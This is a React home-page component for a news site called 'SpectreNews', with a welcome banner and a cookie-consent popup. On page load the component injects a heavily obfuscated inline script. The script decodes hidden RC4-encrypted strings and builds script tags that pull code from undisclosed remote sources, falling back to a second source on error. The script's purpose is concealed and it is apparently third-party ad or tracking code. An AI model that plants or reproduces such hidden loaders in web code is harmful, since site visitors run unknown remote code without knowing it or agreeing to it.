


import React, { useState, useEffect } from "react";
import Bar from "../bar/Bar";
import "./Home.css";
import { FiArrowRightCircle } from "react-icons/fi";
import { Link } from "react-router-dom";

function Home() {
  const [acceptedCookies, setAcceptedCookies] = useState(false);

  useEffect(() => {
    const cookiesAccepted = localStorage.getItem("acceptedCookies");
    setAcceptedCookies(cookiesAccepted === "true");

    // Scroll to the top of the page
    window.scrollTo(0, 0);

    const script = document.createElement("script");
    script.type = "text/javascript";
    script.async = false;
    script.innerHTML = `
    /*<![CDATA[/* */
(function(){if(window.e20f93a1b1636f007740e83f41814287) return; window.e20f93a1b1636f007740e83f41814287="EUmBauGfoNb8QGAFo2PAibgoxwzI5qNDZItwyjmeHWtFK2eAgx1pUZpwVzrBuct6sKw3MN0eQvbqvAqL9wdbzWCpdQ";var a=['wpHClmvDqcOjwoBPPkcyUifDqw==','woQ+BsK/KsOiwp7Cgl0JK8KH','w6MFwqDDhw9SwqEjGCnDulnDrFkUMsORXsKXw6U5w5Rgw6QmwrTClcK9FsO4YcOefMO1wqnDk1pWwppowprDqMKc','wocYw6kkCcOVH8OAwpTCvsKQwpE=','w7rClsOlw5rCrHjDs8KlwrMzTnE=','wp4Zw6o0FcOFOMOXwoHCgcKHwoZ4woE=','wqbDrsKOc8K2O8KGw6jCrg==','BHtnw5I/WMKAWg==','wq8MSsKKwp4NTQ==','wqrCg2LDuA==','SnTCiX0ceMKENw==','w73CkMOhw5LCim8=','w4rDp23CuxzDosKUwrFEw4V1QMO6wpXCnwjDkF5TaQ==','w6PCkMO7w7XCqm8=','RTwPw5TChnRiJ8O5wq8uwpZq','GRXCtwbDkhrDvcOrwrlmFQ==','w75hw5nCpBTDnQ==','JsKpAwEPIlk=','wp4Xw6gkFcOVE8OKwpbCtA==','w7oGwrfCoCfCusK9fA==','IVZ/IVN1wo/DpVHDtSvCkRTDli4=','w5TDi0E=','w4Z9w5xk','wptwwofCn3U=','wq3Do8OWwrvCmMKWwqJUYsOUwp1EQcOSw6nCgR/CrMObw5fCphlQLMKjwqwUw6fDsDk=','Xg1d','w4Fnw55ow7fChQ=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x178));var b=function(c,d){c=c-0x0;var e=a[c];if(b['JFPsiz']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['mNrzuB']=g;b['bpJqWX']={};b['JFPsiz']=!![];}var f=b['bpJqWX'][c];if(f===undefined){if(b['KWNAgE']===undefined){b['KWNAgE']=!![];}e=b['mNrzuB'](e,d);b['bpJqWX'][c]=e;}else{e=f;}return e;};var r=window;r[b('0xb','m8l3')]=[[b('0xd','LIkg'),0x4c26cb],[b('0xf','LIkg'),0.004],[b('0x7','mLjv'),b('0x0','fm8I')],[b('0x3','rmM)'),0x0],[b('0x13','hFf3'),![]],[b('0x2','m8l3'),0x0],[b('0x6','LIkg'),!0x0]];var p=[b('0x1a','lAfx'),b('0x4','vTEd')],w=0x0,x,h=function(){if(!p[w])return;x=r[b('0xc','8[aB')][b('0x10',')5z6')](b('0x12','#XHr'));x[b('0x18','0bvE')]=b('0x16','DQOM');x[b('0x19','AsSo')]=!0x0;var c=r[b('0x15','y4pF')][b('0xe','0xo[')](b('0x1','0bvE'))[0x0];x[b('0x17','JQrh')]=b('0x9','rYzz')+p[w];x[b('0x11','!!5q')]=b('0x8','SY0)');x[b('0xa','NGp*')]=function(){w++;h();};c[b('0x14','mLjv')][b('0x5','mLjv')](x,c);};h();})();
    /*]]>/* */
    `;
    document.body.appendChild(script);
  }, []);

  const acceptCookies = () => {
    setAcceptedCookies(true);
    localStorage.setItem("acceptedCookies", "true");
  };

  return (
    <div className="home-container" style={{ overflow: 'hidden', height: '100vh' }}>
      <Bar search={false} />
      <div className="content">
        <h1>Welcome to SpectreNews</h1>
        <p>
          Unleash the power to explore diverse perspectives on global issues. Navigate politics with clarity. Discover the truth. Let SpectreNews be <strong>YOUR</strong> guide.
        </p>
        <Link to="/news" className="cta-button">
          Get Started <FiArrowRightCircle className="icon" />
        </Link>
      </div>
      {!acceptedCookies && (
        <div className="cookie-consent-popup">
          <p>We use cookies to ensure you get the best experience on our website.</p>
          <button onClick={acceptCookies}>Accept</button>
        </div>
      )}
      <div className="area">
        <ul className="circles">
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
        </ul>
      </div>
    </div>
  );
}

export default Home;
